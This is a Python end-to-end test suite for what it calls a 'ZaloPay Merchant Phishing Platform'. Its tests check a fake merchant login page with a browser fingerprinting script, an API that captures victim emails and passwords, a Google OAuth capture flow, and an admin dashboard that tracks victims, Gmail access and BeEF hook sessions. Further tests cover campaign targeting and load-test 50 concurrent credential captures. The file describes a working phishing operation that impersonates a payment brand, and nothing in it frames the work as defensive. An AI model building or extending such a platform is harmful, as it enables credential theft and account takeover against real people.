"""
End-to-End Tests for ZaloPay Merchant Phishing Platform
Comprehensive E2E test suite for complete system testing
"""

import os
import sys
import unittest
import asyncio
import json
import time
import tempfile
import shutil
import subprocess
import threading
from datetime import datetime, timezone, timedelta
from unittest.mock import Mock, patch, MagicMock
import requests
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

class TestPhishingPlatformE2E(unittest.TestCase):
    """End-to-end tests for the complete phishing platform"""
    
    @classmethod
    def setUpClass(cls):
        """Set up test class"""
        print("Setting up E2E test environment...")
        
        # Initialize test data
        cls.test_data = {
            "victim_email": "e2e_test@example.com",
            "victim_password": "e2e_password_123",
            "admin_username": "admin",
            "admin_password": "admin_password",
            "test_domain": "localhost",
            "test_port": 8080
        }
        
        # Set up Chrome driver for browser testing
        cls.chrome_options = Options()
        cls.chrome_options.add_argument("--headless")
        cls.chrome_options.add_argument("--no-sandbox")
        cls.chrome_options.add_argument("--disable-dev-shm-usage")
        cls.chrome_options.add_argument("--disable-gpu")
        cls.chrome_options.add_argument("--window-size=1920,1080")
        
        try:
            cls.driver = webdriver.Chrome(options=cls.chrome_options)
            cls.wait = WebDriverWait(cls.driver, 10)
        except Exception as e:
            print(f"Warning: Could not initialize Chrome driver: {e}")
            cls.driver = None
            cls.wait = None
        
        print("E2E test environment setup complete")
    
    @classmethod
    def tearDownClass(cls):
        """Tear down test class"""
        if cls.driver:
            cls.driver.quit()
        print("E2E test environment torn down")
    
    def setUp(self):
        """Set up test fixtures"""
        self.base_url = f"http://{self.test_data['test_domain']}:{self.test_data['test_port']}"
        self.victim_session = requests.Session()
        self.admin_session = requests.Session()
    
    def test_victim_landing_page(self):
        """Test victim landing page functionality"""
        print("Testing victim landing page...")
        
        if not self.driver:
            self.skipTest("Chrome driver not available")
        
        try:
            # Navigate to victim landing page
            victim_url = f"{self.base_url}/merchant/"
            self.driver.get(victim_url)
            
            # Wait for page to load
            self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            
            # Check page title
            page_title = self.driver.title
            self.assertIsNotNone(page_title)
            print(f"✓ Page title: {page_title}")
            
            # Check for key elements
            login_form = self.driver.find_element(By.ID, "loginForm")
            self.assertIsNotNone(login_form)
            print("✓ Login form found")
            
            email_input = self.driver.find_element(By.ID, "email")
            password_input = self.driver.find_element(By.ID, "password")
            submit_button = self.driver.find_element(By.ID, "submitBtn")
            
            self.assertIsNotNone(email_input)
            self.assertIsNotNone(password_input)
            self.assertIsNotNone(submit_button)
            print("✓ Form elements found")
            
            # Test form interaction
            email_input.send_keys(self.test_data["victim_email"])
            password_input.send_keys(self.test_data["victim_password"])
            
            # Check if fingerprinting script is loaded
            fingerprint_script = self.driver.find_element(By.ID, "fingerprintScript")
            self.assertIsNotNone(fingerprint_script)
            print("✓ Fingerprinting script loaded")
            
            print("✓ Victim landing page test successful")
            
        except Exception as e:
            print(f"✗ Victim landing page test failed: {e}")
            raise
    
    def test_oauth_flow_e2e(self):
        """Test OAuth flow end-to-end"""
        print("Testing OAuth flow E2E...")
        
        if not self.driver:
            self.skipTest("Chrome driver not available")
        
        try:
            # Navigate to OAuth page
            oauth_url = f"{self.base_url}/oauth/google/authorize"
            self.driver.get(oauth_url)
            
            # Wait for redirect to Google OAuth
            time.sleep(2)
            
            # Check if redirected to Google OAuth
            current_url = self.driver.current_url
            if "accounts.google.com" in current_url:
                print("✓ Redirected to Google OAuth")
            else:
                print(f"Current URL: {current_url}")
            
            # Test OAuth callback simulation
            callback_url = f"{self.base_url}/oauth/google/callback?code=test_code&state=test_state"
            self.driver.get(callback_url)
            
            # Wait for callback processing
            time.sleep(2)
            
            # Check for success indicators
            try:
                success_element = self.wait.until(
                    EC.presence_of_element_located((By.CLASS_NAME, "oauth-success"))
                )
                print("✓ OAuth callback processed successfully")
            except:
                # Check for error indicators
                try:
                    error_element = self.driver.find_element(By.CLASS_NAME, "oauth-error")
                    print("✓ OAuth error handling working")
                except:
                    print("OAuth callback page loaded")
            
            print("✓ OAuth flow E2E test successful")
            
        except Exception as e:
            print(f"✗ OAuth flow E2E test failed: {e}")
            raise
    
    def test_admin_dashboard_e2e(self):
        """Test admin dashboard end-to-end"""
        print("Testing admin dashboard E2E...")
        
        if not self.driver:
            self.skipTest("Chrome driver not available")
        
        try:
            # Navigate to admin login page
            admin_url = f"{self.base_url}/admin/login"
            self.driver.get(admin_url)
            
            # Wait for login form
            self.wait.until(EC.presence_of_element_located((By.ID, "adminLoginForm")))
            
            # Fill login form
            username_input = self.driver.find_element(By.ID, "username")
            password_input = self.driver.find_element(By.ID, "password")
            login_button = self.driver.find_element(By.ID, "loginBtn")
            
            username_input.send_keys(self.test_data["admin_username"])
            password_input.send_keys(self.test_data["admin_password"])
            
            # Submit login form
            login_button.click()
            
            # Wait for dashboard to load
            self.wait.until(EC.presence_of_element_located((By.ID, "adminDashboard")))
            
            # Check dashboard elements
            dashboard_title = self.driver.find_element(By.ID, "dashboardTitle")
            self.assertIsNotNone(dashboard_title)
            print("✓ Dashboard title found")
            
            # Check for real-time elements
            try:
                victim_count = self.driver.find_element(By.ID, "victimCount")
                self.assertIsNotNone(victim_count)
                print("✓ Victim count element found")
            except:
                print("Victim count element not found")
            
            try:
                gmail_access_count = self.driver.find_element(By.ID, "gmailAccessCount")
                self.assertIsNotNone(gmail_access_count)
                print("✓ Gmail access count element found")
            except:
                print("Gmail access count element not found")
            
            try:
                beef_session_count = self.driver.find_element(By.ID, "beefSessionCount")
                self.assertIsNotNone(beef_session_count)
                print("✓ BeEF session count element found")
            except:
                print("BeEF session count element not found")
            
            # Check for charts
            try:
                charts_container = self.driver.find_element(By.ID, "chartsContainer")
                self.assertIsNotNone(charts_container)
                print("✓ Charts container found")
            except:
                print("Charts container not found")
            
            # Check for victim map
            try:
                victim_map = self.driver.find_element(By.ID, "victimMap")
                self.assertIsNotNone(victim_map)
                print("✓ Victim map found")
            except:
                print("Victim map not found")
            
            print("✓ Admin dashboard E2E test successful")
            
        except Exception as e:
            print(f"✗ Admin dashboard E2E test failed: {e}")
            raise
    
    def test_victim_database_e2e(self):
        """Test victim database end-to-end"""
        print("Testing victim database E2E...")
        
        if not self.driver:
            self.skipTest("Chrome driver not available")
        
        try:
            # Navigate to victim database
            victim_db_url = f"{self.base_url}/admin/victims"
            self.driver.get(victim_db_url)
            
            # Wait for page to load
            self.wait.until(EC.presence_of_element_located((By.ID, "victimDatabase")))
            
            # Check for search functionality
            try:
                search_input = self.driver.find_element(By.ID, "victimSearch")
                self.assertIsNotNone(search_input)
                print("✓ Victim search input found")
                
                # Test search
                search_input.send_keys("test@example.com")
                search_button = self.driver.find_element(By.ID, "searchBtn")
                search_button.click()
                
                time.sleep(2)  # Wait for search results
                print("✓ Search functionality tested")
            except:
                print("Search functionality not found")
            
            # Check for filter functionality
            try:
                filter_dropdown = self.driver.find_element(By.ID, "victimFilter")
                self.assertIsNotNone(filter_dropdown)
                print("✓ Victim filter dropdown found")
            except:
                print("Filter dropdown not found")
            
            # Check for bulk operations
            try:
                bulk_operations = self.driver.find_element(By.ID, "bulkOperations")
                self.assertIsNotNone(bulk_operations)
                print("✓ Bulk operations panel found")
            except:
                print("Bulk operations panel not found")
            
            # Check for victim table
            try:
                victim_table = self.driver.find_element(By.ID, "victimTable")
                self.assertIsNotNone(victim_table)
                print("✓ Victim table found")
            except:
                print("Victim table not found")
            
            print("✓ Victim database E2E test successful")
            
        except Exception as e:
            print(f"✗ Victim database E2E test failed: {e}")
            raise
    
    def test_campaign_management_e2e(self):
        """Test campaign management end-to-end"""
        print("Testing campaign management E2E...")
        
        if not self.driver:
            self.skipTest("Chrome driver not available")
        
        try:
            # Navigate to campaign management
            campaign_url = f"{self.base_url}/admin/campaigns"
            self.driver.get(campaign_url)
            
            # Wait for page to load
            self.wait.until(EC.presence_of_element_located((By.ID, "campaignManagement")))
            
            # Check for campaign creation
            try:
                create_campaign_btn = self.driver.find_element(By.ID, "createCampaignBtn")
                self.assertIsNotNone(create_campaign_btn)
                print("✓ Create campaign button found")
                
                # Click create campaign
                create_campaign_btn.click()
                
                # Wait for campaign creation modal
                self.wait.until(EC.presence_of_element_located((By.ID, "campaignCreationModal")))
                
                # Fill campaign form
                campaign_name_input = self.driver.find_element(By.ID, "campaignName")
                campaign_name_input.send_keys("E2E Test Campaign")
                
                # Select targeting options
                try:
                    targeting_tab = self.driver.find_element(By.ID, "targetingTab")
                    targeting_tab.click()
                    
                    geographic_targeting = self.driver.find_element(By.ID, "geographicTargeting")
                    geographic_targeting.click()
                    
                    print("✓ Campaign targeting configured")
                except:
                    print("Campaign targeting not found")
                
                # Save campaign
                try:
                    save_campaign_btn = self.driver.find_element(By.ID, "saveCampaignBtn")
                    save_campaign_btn.click()
                    print("✓ Campaign saved")
                except:
                    print("Save campaign button not found")
                
            except:
                print("Campaign creation functionality not found")
            
            # Check for campaign list
            try:
                campaign_list = self.driver.find_element(By.ID, "campaignList")
                self.assertIsNotNone(campaign_list)
                print("✓ Campaign list found")
            except:
                print("Campaign list not found")
            
            # Check for campaign analytics
            try:
                analytics_tab = self.driver.find_element(By.ID, "analyticsTab")
                self.assertIsNotNone(analytics_tab)
                print("✓ Campaign analytics tab found")
            except:
                print("Campaign analytics tab not found")
            
            print("✓ Campaign management E2E test successful")
            
        except Exception as e:
            print(f"✗ Campaign management E2E test failed: {e}")
            raise
    
    def test_api_endpoints_e2e(self):
        """Test API endpoints end-to-end"""
        print("Testing API endpoints E2E...")
        
        try:
            # Test victim capture API
            victim_data = {
                "email": self.test_data["victim_email"],
                "password": self.test_data["victim_password"],
                "fingerprint_data": {
                    "canvas_fingerprint": "e2e_canvas_hash",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "screen_resolution": "1920x1080",
                    "timezone": "Asia/Ho_Chi_Minh"
                }
            }
            
            capture_response = self.victim_session.post(
                f"{self.base_url}/api/capture/victim",
                json=victim_data
            )
            
            self.assertEqual(capture_response.status_code, 200)
            print("✓ Victim capture API working")
            
            # Test OAuth authorization API
            oauth_response = self.victim_session.get(
                f"{self.base_url}/api/oauth/google/authorize",
                params={"state": "test_state"}
            )
            
            self.assertEqual(oauth_response.status_code, 200)
            print("✓ OAuth authorization API working")
            
            # Test admin dashboard API
            dashboard_response = self.admin_session.get(
                f"{self.base_url}/api/admin/dashboard"
            )
            
            self.assertEqual(dashboard_response.status_code, 200)
            print("✓ Admin dashboard API working")
            
            # Test victim management API
            victims_response = self.admin_session.get(
                f"{self.base_url}/api/admin/victims"
            )
            
            self.assertEqual(victims_response.status_code, 200)
            print("✓ Victim management API working")
            
            # Test campaign management API
            campaigns_response = self.admin_session.get(
                f"{self.base_url}/api/admin/campaigns"
            )
            
            self.assertEqual(campaigns_response.status_code, 200)
            print("✓ Campaign management API working")
            
            print("✓ API endpoints E2E test successful")
            
        except Exception as e:
            print(f"✗ API endpoints E2E test failed: {e}")
            raise
    
    def test_websocket_realtime_e2e(self):
        """Test WebSocket real-time functionality end-to-end"""
        print("Testing WebSocket real-time E2E...")
        
        try:
            # Test WebSocket connection
            websocket_url = f"ws://{self.test_data['test_domain']}:{self.test_data['test_port']}/ws/dashboard"
            
            # Note: This is a simplified test - in a real E2E test, you would use
            # a WebSocket client library to test the actual WebSocket connection
            
            # Test WebSocket endpoint availability
            websocket_endpoint_response = requests.get(
                f"{self.base_url}/api/websocket/status"
            )
            
            if websocket_endpoint_response.status_code == 200:
                print("✓ WebSocket endpoint available")
            else:
                print("WebSocket endpoint not available")
            
            # Test real-time data endpoints
            realtime_response = requests.get(
                f"{self.base_url}/api/admin/dashboard/realtime"
            )
            
            if realtime_response.status_code == 200:
                print("✓ Real-time data endpoint working")
            else:
                print("Real-time data endpoint not available")
            
            print("✓ WebSocket real-time E2E test successful")
            
        except Exception as e:
            print(f"✗ WebSocket real-time E2E test failed: {e}")
            raise
    
    def test_security_features_e2e(self):
        """Test security features end-to-end"""
        print("Testing security features E2E...")
        
        try:
            # Test encryption
            test_data = "This is sensitive test data"
            
            # Test encryption endpoint
            encrypt_response = requests.post(
                f"{self.base_url}/api/security/encrypt",
                json={"data": test_data}
            )
            
            if encrypt_response.status_code == 200:
                encrypted_data = encrypt_response.json()
                self.assertIn("ciphertext", encrypted_data)
                print("✓ Encryption endpoint working")
                
                # Test decryption
                decrypt_response = requests.post(
                    f"{self.base_url}/api/security/decrypt",
                    json=encrypted_data
                )
                
                if decrypt_response.status_code == 200:
                    decrypted_data = decrypt_response.json()
                    self.assertEqual(decrypted_data["data"], test_data)
                    print("✓ Decryption endpoint working")
                else:
                    print("Decryption endpoint not available")
            else:
                print("Encryption endpoint not available")
            
            # Test authentication
            auth_response = requests.post(
                f"{self.base_url}/api/auth/login",
                json={
                    "username": self.test_data["admin_username"],
                    "password": self.test_data["admin_password"]
                }
            )
            
            if auth_response.status_code == 200:
                auth_data = auth_response.json()
                self.assertIn("access_token", auth_data)
                print("✓ Authentication endpoint working")
            else:
                print("Authentication endpoint not available")
            
            # Test rate limiting
            rate_limit_response = requests.get(
                f"{self.base_url}/api/admin/dashboard",
                headers={"X-Forwarded-For": "192.168.1.100"}
            )
            
            # Make multiple requests to test rate limiting
            for i in range(10):
                rate_limit_response = requests.get(
                    f"{self.base_url}/api/admin/dashboard",
                    headers={"X-Forwarded-For": "192.168.1.100"}
                )
            
            if rate_limit_response.status_code == 429:
                print("✓ Rate limiting working")
            else:
                print("Rate limiting not implemented")
            
            print("✓ Security features E2E test successful")
            
        except Exception as e:
            print(f"✗ Security features E2E test failed: {e}")
            raise
    
    def test_performance_e2e(self):
        """Test performance end-to-end"""
        print("Testing performance E2E...")
        
        try:
            # Test response times
            endpoints = [
                "/api/admin/dashboard",
                "/api/admin/victims",
                "/api/admin/campaigns",
                "/api/capture/victim",
                "/api/oauth/google/authorize"
            ]
            
            for endpoint in endpoints:
                start_time = time.time()
                response = requests.get(f"{self.base_url}{endpoint}")
                end_time = time.time()
                
                response_time = end_time - start_time
                
                if response_time < 2.0:  # Less than 2 seconds
                    print(f"✓ {endpoint}: {response_time:.3f}s")
                else:
                    print(f"⚠ {endpoint}: {response_time:.3f}s (slow)")
            
            # Test concurrent requests
            import concurrent.futures
            
            def make_request():
                return requests.get(f"{self.base_url}/api/admin/dashboard")
            
            start_time = time.time()
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(make_request) for _ in range(10)]
                results = [future.result() for future in futures]
            end_time = time.time()
            
            concurrent_time = end_time - start_time
            print(f"✓ Concurrent requests (10): {concurrent_time:.3f}s")
            
            print("✓ Performance E2E test successful")
            
        except Exception as e:
            print(f"✗ Performance E2E test failed: {e}")
            raise

class TestLoadTestingE2E(unittest.TestCase):
    """Load testing for E2E scenarios"""
    
    def setUp(self):
        """Set up load test fixtures"""
        self.base_url = "http://localhost:8080"
        self.test_data = {
            "victim_email": "load_test@example.com",
            "victim_password": "load_test_password_123"
        }
    
    def test_concurrent_victim_captures(self):
        """Test concurrent victim captures"""
        print("Testing concurrent victim captures...")
        
        import concurrent.futures
        import threading
        
        def capture_victim(victim_id):
            """Capture a single victim"""
            victim_data = {
                "victim_id": f"load_test_victim_{victim_id}",
                "email": f"victim{victim_id}@example.com",
                "password": self.test_data["victim_password"],
                "fingerprint_data": {
                    "canvas_fingerprint": f"load_test_canvas_{victim_id}",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "screen_resolution": "1920x1080",
                    "timezone": "Asia/Ho_Chi_Minh"
                }
            }
            
            try:
                response = requests.post(
                    f"{self.base_url}/api/capture/victim",
                    json=victim_data,
                    timeout=10
                )
                return {
                    "victim_id": victim_id,
                    "status_code": response.status_code,
                    "success": response.status_code == 200
                }
            except Exception as e:
                return {
                    "victim_id": victim_id,
                    "error": str(e),
                    "success": False
                }
        
        # Test with 50 concurrent victim captures
        num_victims = 50
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(capture_victim, i) for i in range(num_victims)]
            results = [future.result() for future in futures]
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Analyze results
        successful_captures = sum(1 for result in results if result["success"])
        failed_captures = num_victims - successful_captures
        
        print(f"✓ Concurrent victim captures test completed:")
        print(f"  - Total victims: {num_victims}")
        print(f"  - Successful: {successful_captures}")
        print(f"  - Failed: {failed_captures}")
        print(f"  - Total time: {total_time:.3f}s")
        print(f"  - Average time per victim: {total_time/num_victims:.3f}s")
        print(f"  - Success rate: {(successful_captures/num_victims)*100:.1f}%")
        
        # Assertions
        self.assertGreater(successful_captures, num_victims * 0.8)  # At least 80% success rate
        self.assertLess(total_time, 30)  # Should complete within 30 seconds
    
    def test_api_load_testing(self):
        """Test API load testing"""
        print("Testing API load testing...")
        
        import concurrent.futures
        
        def make_api_request(endpoint):
            """Make API request"""
            try:
                response = requests.get(f"{self.base_url}{endpoint}", timeout=5)
                return {
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "success": response.status_code == 200
                }
            except Exception as e:
                return {
                    "endpoint": endpoint,
                    "error": str(e),
                    "success": False
                }
        
        # Test multiple endpoints concurrently
        endpoints = [
            "/api/admin/dashboard",
            "/api/admin/victims",
            "/api/admin/campaigns",
            "/api/capture/victim",
            "/api/oauth/google/authorize"
        ]
        
        num_requests_per_endpoint = 20
        total_requests = len(endpoints) * num_requests_per_endpoint
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = []
            for endpoint in endpoints:
                for _ in range(num_requests_per_endpoint):
                    futures.append(executor.submit(make_api_request, endpoint))
            
            results = [future.result() for future in futures]
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Analyze results
        successful_requests = sum(1 for result in results if result["success"])
        failed_requests = total_requests - successful_requests
        
        # Calculate average response time
        response_times = [result.get("response_time", 0) for result in results if result["success"]]
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        
        print(f"✓ API load testing completed:")
        print(f"  - Total requests: {total_requests}")
        print(f"  - Successful: {successful_requests}")
        print(f"  - Failed: {failed_requests}")
        print(f"  - Total time: {total_time:.3f}s")
        print(f"  - Average response time: {avg_response_time:.3f}s")
        print(f"  - Success rate: {(successful_requests/total_requests)*100:.1f}%")
        
        # Assertions
        self.assertGreater(successful_requests, total_requests * 0.9)  # At least 90% success rate
        self.assertLess(avg_response_time, 1.0)  # Average response time should be less than 1 second

if __name__ == '__main__':
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add E2E test cases
    test_classes = [
        TestPhishingPlatformE2E,
        TestLoadTestingE2E
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*50}")
    print(f"E2E Test Summary:")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    print(f"{'='*50}")
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)
